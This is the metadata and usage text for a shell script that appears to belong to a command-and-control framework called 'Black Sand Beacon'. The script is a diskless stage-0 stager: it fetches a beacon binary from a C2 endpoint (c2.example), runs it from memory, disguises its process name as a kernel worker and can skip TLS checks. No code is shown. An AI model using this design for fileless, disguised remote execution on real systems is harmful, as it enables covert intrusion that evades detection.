doc.summary: Black Sand Beacon diskless stager (Stage-0 one-liner).
doc.description: Fetches the packed beacon ELF + config from the C2 staging endpoints and execs the beacon from an anonymous memfd. Never touches disk.  Environment: BSB_STAGE_URL          e.g. https://c2.example:7070 BSB_STAGE_TOKEN        must match server.stage_token in config.json BSB_STAGE_ARGV0        optional argv[0] disguise (default kworker/u8:2) BSB_STAGE_INSECURE_TLS set to 1 to skip TLS verification (lab only)  Usage: bash stage_oneliner.sh bash stage_oneliner.sh --print   # print the copy-paste one-liner
